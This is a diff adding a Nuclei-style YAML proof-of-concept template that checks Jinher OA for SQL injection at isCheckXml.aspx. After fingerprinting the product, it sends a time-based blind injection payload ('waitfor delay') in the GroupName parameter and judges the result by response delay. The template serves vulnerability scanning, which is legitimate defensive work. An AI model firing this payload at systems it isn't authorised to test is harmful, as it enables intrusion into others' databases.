@@ -1,0 +1,43 @@
+id: poc-yaml-jinher-jhsoft-ischeckxml-aspx-sqli
+info:
+  name: 金和OA isCheckXml.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - method: GET
+    path:
+      - >-
+        {{BaseURL}}/c6/Jhsoft.Web.groups/isCheckXml.aspx/?GroupName=1'waitfor+delay%270:0:{{t1}}%27--&GroupID=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ok"
+        part: body
+      - type: word
+        words:
+          - "Cookie"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
